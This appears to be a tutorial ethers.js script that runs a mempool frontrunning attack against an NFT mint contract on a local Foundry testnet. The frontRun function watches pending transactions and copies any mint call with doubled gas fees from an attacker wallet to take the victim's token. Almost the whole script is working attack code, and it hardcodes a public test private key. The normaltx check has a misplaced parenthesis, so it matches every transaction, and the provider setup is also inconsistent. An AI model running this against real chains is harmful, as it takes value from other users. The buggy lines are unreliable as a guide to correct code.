//1.Connect to the local network of Foundry
import { ethers } from "ethers";
const provider = new ethers.providers.WebSocketProvider('http://127.0.0.1:8545')
let network = provider.getNetwork()
network.then(res => console.log(`[${(new Date).toLocaleTimeString()}] Connected to network ${res.chainId}`))

//2.Build contract instance
const contractABI = [
    "function mint() public",
    "function ownerOf(uint256) public view returns (address) ",
    "function totalSupply() view returns (uint256)"
]
const contractAddress = '0xC76A71C4492c11bbaDC841342C4Cb470b5d12193'
const contractFM = new ethers.Contract(contractAddress, contractABI, provider)

//3.Create Interface object to retrieve mint function
const iface = new ethers.utils.Interface(contractABI)
function getSignature(fn) {
    return iface.getSighash(fn)
}

//4.Create a test wallet to send frontrun transaction, the private key is provided by Foundry testnet
const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'
const wallet = new ethers.Wallet(privateKey, provider)

//5.Build a normal mint function, verify the mint result, and display it
const normaltx = async () => {
    provider.on('pending', async (txHash) => {
        provider.getTransaction(txHash).then(
            async (tx) => {
                if (tx.data.indexOf(getSignature("mint") !== -1)) {
                    console.log(`[${(new Date).toLocaleTimeString()}] Detected transaction: ${txHash}`)
                    console.log(`Address initiating the mint: ${tx.from}`)
                    await tx.wait()
                    const tokenId = await contractFM.totalSupply()
                    console.log(`Minted NFT token ID: ${tokenId}`)
                    console.log(`The owner of NFT with ID ${tokenId} is ${await contractFM.ownerOf(tokenId)}`)
                    console.log(`Is the address initiating the mint the owner of the NFT: ${tx.from === await contractFM.ownerOf(tokenId)}`)
                }
            }
        )
    })
}

//6.Build frontrun transaction, verify the mint result, and successful frontrunning
const frontRun = async () => {
    provider.on('pending', async (txHash) => {
        const tx = await provider.getTransaction(txHash)
        if (tx.data.indexOf(getSignature("mint")) !== -1 && tx.from !== wallet.address) {
            console.log(`[${(new Date).toLocaleTimeString()}] Detected transaction: ${txHash}\nPreparing to frontrun transaction`)
            const frontRunTx = {
                to: tx.to,
                value: tx.value,
                maxPriorityFeePerGas: tx.maxPriorityFeePerGas.mul(2),
                maxFeePerGas: tx.maxFeePerGas.mul(2),
                gasLimit: tx.gasLimit.mul(2),
                data: tx.data
            }
            const aimTokenId = (await contractFM.totalSupply()).add(1)
            console.log(`The NFT token ID to be minted is: ${aimTokenId}`)//Print the NFT ID that should be minted
            const sentFR = await wallet.sendTransaction(frontRunTx)
            console.log(`Sending frontrun transaction`)
            const receipt = await sentFR.wait()
            console.log(`Frontrun transaction successful, transaction hash: ${receipt.transactionHash}`)
            console.log(`Address initiating the mint: ${tx.from}`)
            console.log(`The owner of NFT with ID ${aimTokenId} is ${await contractFM.ownerOf(aimTokenId)}`)//The owner of the minted NFT is not tx.from
            console.log(`The owner of NFT with ID ${aimTokenId.add(1)} is: ${await contractFM.ownerOf(aimTokenId.add(1))}`)//tx.from is frontrun by wallet.address and minted the next NFT
            console.log(`Is the address initiating the mint the owner of the NFT: ${tx.from === await contractFM.ownerOf(aimTokenId)}`)//Compare addresses, tx.from is frontrun
            //Verify the data inside the block
            const block = await provider.getBlock(tx.blockNumber)
            console.log(`Detailed transaction data within the block: ${block.transactions}`)//In the block, the later transaction is placed before the earlier one, successfully frontrun.
        }
    })
}


frontRun()
//normaltx()